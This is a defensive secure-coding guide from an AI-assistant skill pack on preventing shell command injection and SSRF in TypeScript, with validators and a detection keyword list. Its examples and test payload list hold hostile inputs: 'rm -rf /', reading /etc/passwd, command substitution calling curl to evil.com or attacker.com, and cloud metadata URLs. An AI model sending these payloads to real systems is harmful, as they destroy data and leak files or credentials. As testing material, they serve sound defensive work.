<!--
================================================================================
PAI CORE - USER/PAISECURITYSYSTEM/COMMANDINJECTION.md
================================================================================

PURPOSE:
Comprehensive guide to preventing command injection vulnerabilities in PAI code.
Covers shell safety, input validation, and secure coding patterns.

LOCATION:
- Private Installation: ${PAI_DIR}/skills/CORE/USER/PAISECURITYSYSTEM/COMMANDINJECTION.md
- PAI Pack: Packs/kai-core-install/src/skills/CORE/USER/PAISECURITYSYSTEM/COMMANDINJECTION.md

CUSTOMIZATION:
- [ ] Review examples and adapt to your codebase
- [ ] Add organization-specific URL allowlists
- [ ] Configure logging paths for your installation

RELATED FILES:
- PROMPTINJECTION.md - Prompt injection defense
- patterns.yaml - Security rules
- ARCHITECTURE.md - Trust hierarchy

LAST UPDATED: 2026-01-08
VERSION: 1.2.0
================================================================================
-->

# Command Injection & Shell Safety

**MANDATORY FOR ALL PAI CODE**

---

## THREAT

Shell command injection via unsanitized external input (URLs, filenames, API parameters) passed to shell commands, allowing arbitrary command execution.

---

## THE CORE VULNERABILITY

**Shell Metacharacter Interpretation:**

When external input is interpolated directly into shell command strings, shell metacharacters are interpreted:
- `;` (command separator)
- `|` (pipe)
- `&` (background execution)
- `$()` or `` ` `` (command substitution)
- `>` `<` (redirection)
- `*` `?` (glob expansion)

**Example Attack:**
```typescript
// VULNERABLE CODE
const url = userInput; // "https://example.com; rm -rf / #"
await exec(`curl -L "${url}"`);
// Executes: curl -L "https://example.com; rm -rf / #"
// Which runs TWO commands: curl AND rm -rf /
```

---

## DEFENSE PROTOCOL

### 1. NEVER Use Shell Interpolation for External Input

**ALWAYS VULNERABLE:**
```typescript
// BAD - Shell interpolation with external input
exec(`curl "${url}"`);
exec(`wget ${url}`);
exec(`git clone ${repoUrl}`);
exec(`python script.py ${filename}`);
$`some-command ${externalInput}`; // Even with template literals!
```

**SAFE - Separate Arguments (No Shell):**
```typescript
import { execFile } from 'child_process';
import { promisify } from 'util';

const execFileAsync = promisify(execFile);

// SAFE - Arguments passed separately, NO shell interpretation
await execFileAsync('curl', ['-L', url]);
await execFileAsync('git', ['clone', repoUrl]);
await execFileAsync('python', ['script.py', filename]);
```

**EVEN BETTER - Native Libraries:**
```typescript
// BEST - No shell involved at all
import { fetch } from 'bun';

const response = await fetch(url);
const html = await response.text();
```

### 2. Validate ALL External Input

**URL Validation (Mandatory for Web Scraping):**
```typescript
function validateUrl(url: string): void {
  // 1. Schema allowlist
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    throw new Error('Only HTTP/HTTPS URLs allowed');
  }

  // 2. Parse and validate structure
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    throw new Error('Invalid URL format');
  }

  // 3. SSRF protection - block internal/private IPs
  const blocked = [
    '127.0.0.1', 'localhost', '0.0.0.0',
    '::1', // IPv6 localhost
    '169.254.169.254', // AWS metadata service
    '169.254.', // Link-local addresses
    'metadata.google.internal', // GCP metadata
  ];

  const hostname = parsed.hostname.toLowerCase();

  if (blocked.some(b => hostname === b || hostname.startsWith(b))) {
    throw new Error('Internal/private URLs not allowed');
  }

  // Block private IP ranges
  if (
    hostname.startsWith('10.') ||
    hostname.startsWith('172.16.') ||
    hostname.startsWith('192.168.') ||
    hostname.startsWith('fc00:') || // IPv6 private
    hostname.startsWith('fd00:')
  ) {
    throw new Error('Private network URLs not allowed');
  }

  // 4. Character allowlisting (URL-safe characters only)
  if (!/^[a-zA-Z0-9:\/\-._~?#\[\]@!$&'()*+,;=%]+$/.test(url)) {
    throw new Error('URL contains invalid characters');
  }

  // 5. Protocol validation (prevent file://, javascript:, data:, etc.)
  if (!['http:', 'https:'].includes(parsed.protocol)) {
    throw new Error('Only HTTP/HTTPS protocols allowed');
  }
}
```

**Filename Validation:**
```typescript
function validateFilename(filename: string): void {
  // Block path traversal
  if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
    throw new Error('Path traversal not allowed');
  }

  // Character allowlisting
  if (!/^[a-zA-Z0-9._-]+$/.test(filename)) {
    throw new Error('Invalid filename characters');
  }

  // Extension allowlist (if applicable)
  const allowedExts = ['.txt', '.json', '.md', '.csv'];
  if (!allowedExts.some(ext => filename.endsWith(ext))) {
    throw new Error('File type not allowed');
  }
}
```

### 3. When Shell Commands Are Necessary

If you MUST use shell commands (rare cases), follow these rules:

```typescript
import { spawn } from 'child_process';

// Use spawn/execFile with argument array
const process = spawn('command', [
  '--option', 'value',
  validatedInput // Passed as separate argument
], {
  shell: false, // CRITICAL: Disable shell interpretation
  timeout: 30000,
  maxBuffer: 10 * 1024 * 1024 // 10MB limit
});
```

**NEVER:**
- Use `exec()` with external input
- Use `child_process.exec()` with string interpolation
- Use Bun's `$` template with external input
- Construct command strings from external input

### 4. Error Sanitization

Errors from external operations can leak sensitive information:

```typescript
try {
  await fetchUrl(url);
} catch (error) {
  // DON'T: Expose raw error to user
  // throw error;

  // DO: Sanitize error message
  if (error instanceof Error) {
    // Remove file paths, internal IPs, stack traces
    const sanitized = error.message
      .replace(/\/Users\/[^\/]+\/[^\s]+/g, '[REDACTED_PATH]')
      .replace(/127\.0\.0\.1|localhost/g, '[INTERNAL]')
      .split('\n')[0]; // Only first line, no stack trace

    throw new Error(`Operation failed: ${sanitized}`);
  }
  throw new Error('Operation failed');
}
```

### 5. Input Validation Layers

Apply defense in depth:

```typescript
async function safeScrape(url: string): Promise<string> {
  // Layer 1: Type validation
  if (typeof url !== 'string') {
    throw new Error('URL must be a string');
  }

  // Layer 2: Format validation
  validateUrl(url); // Throws on invalid

  // Layer 3: Length validation
  if (url.length > 2048) {
    throw new Error('URL too long');
  }

  // Layer 4: Use safe API
  const response = await fetch(url, {
    redirect: 'follow',
    signal: AbortSignal.timeout(10000)
  });

  // Layer 5: Response validation
  if (!response.ok) {
    throw new Error(`HTTP ${response.status}`);
  }

  // Layer 6: Size validation
  const contentLength = response.headers.get('content-length');
  if (contentLength && parseInt(contentLength) > 10_000_000) {
    throw new Error('Response too large');
  }

  return await response.text();
}
```

---

## Suspicious Input Detection

Log suspicious input for security analysis:

```typescript
function detectSuspiciousInput(input: string): void {
  const suspicious = [
    ';', '|', '&', '$', '`', '\n', '\r',
    '$(', '${', '`',
    '../', '..\\',
    'localhost', '127.0.0.1',
    'rm -rf', 'curl', 'wget',
  ];

  const found = suspicious.filter(pattern => input.includes(pattern));

  if (found.length > 0) {
    // Log to security log
    const logEntry = {
      timestamp: new Date().toISOString(),
      type: 'suspicious_input',
      input: input.slice(0, 200), // Truncate for logging
      patterns: found,
      source: 'user_input'
    };

    // Append to security log
    const logPath = '${PAI_DIR}/History/security/input-validation.jsonl';
    appendLog(logPath, logEntry);

    // Report if highly suspicious
    if (found.length >= 3) {
      console.warn('SECURITY: Highly suspicious input detected');
    }
  }
}
```

---

## Testing for Command Injection

**Test every external input with malicious payloads:**

```typescript
const testPayloads = [
  'https://example.com"; whoami #',
  'https://example.com"; rm -rf / #',
  'https://example.com | cat /etc/passwd',
  'https://example.com & curl attacker.com',
  'https://example.com$(curl evil.com)',
  'https://example.com`curl evil.com`',
  'file:///etc/passwd',
  'http://localhost:8080/admin',
  'http://127.0.0.1:22',
  'http://169.254.169.254/latest/meta-data/',
];

// ALL of these should be REJECTED or SANITIZED
for (const payload of testPayloads) {
  try {
    await safeScrape(payload);
    console.error(`FAILED: Accepted malicious input: ${payload}`);
  } catch (error) {
    console.log(`PASSED: Rejected malicious input`);
  }
}
```

---

## Safe Alternatives Checklist

Before using shell commands, check if a safe alternative exists:

| Task | Shell Command | Safe Alternative |
|------|---------------|------------------|
| HTTP request | `curl`, `wget` | `fetch()`, `axios` |
| File operations | `cat`, `grep`, `sed` | `fs.readFile()`, String methods |
| JSON processing | `jq` via shell | `JSON.parse()` |
| Compression | `tar`, `gzip` via shell | Native libraries |
| Git operations | `git` via shell | `isomorphic-git` |
| Database queries | `mysql` via shell | Database drivers |

---

## APPLIES TO

- ANY skill that accepts external input (URLs, filenames, API parameters)
- Web scraping workflows
- Document processing skills
- API integration skills
- File operation workflows
- Database interaction skills

---

## ENFORCEMENT

This is a **CONSTITUTIONAL SECURITY REQUIREMENT**.

Before using shell commands with ANY external input:
1. Can I use a native library instead? (Usually YES)
2. If shell is required, am I using `execFile()` with argument array?
3. Have I validated the input against an allowlist?
4. Have I implemented SSRF protection?
5. Have I tested with malicious payloads?

If you answer NO to any question, DO NOT PROCEED. Use a safe alternative.

---

## WHEN IN DOUBT

**ASK before executing shell commands with external input.**
